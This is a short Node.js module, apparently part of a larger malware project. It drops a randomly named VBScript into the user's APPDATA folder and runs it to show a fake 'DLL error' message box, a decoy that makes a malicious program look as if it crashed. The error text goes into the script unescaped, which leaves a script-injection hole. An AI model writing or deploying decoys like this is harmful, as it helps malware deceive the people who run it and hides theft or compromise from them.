const { exec } = require("child_process");
const { Buffer } = require("buffer");
const fs = require("fs");
const { unique_id, place } = require("./../../utils/functions/functions.js");

const fake_error = async (message, config) => {
    try {
        let vbs = `${process.env.APPDATA}\\${unique_id()}.vbs`;
        fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${message === "" ? "DLL error by k4itrun" : message}", vbInformation, "Error Code: 43"`, "utf8");
        exec(`cscript ${vbs}`, (err, stdout, stderr) => {
            if (err) {
                console.error(err)
            }
        });
    } catch (error) {
        console.error(error);
    }
};

module.exports = {
    fake_error
}
  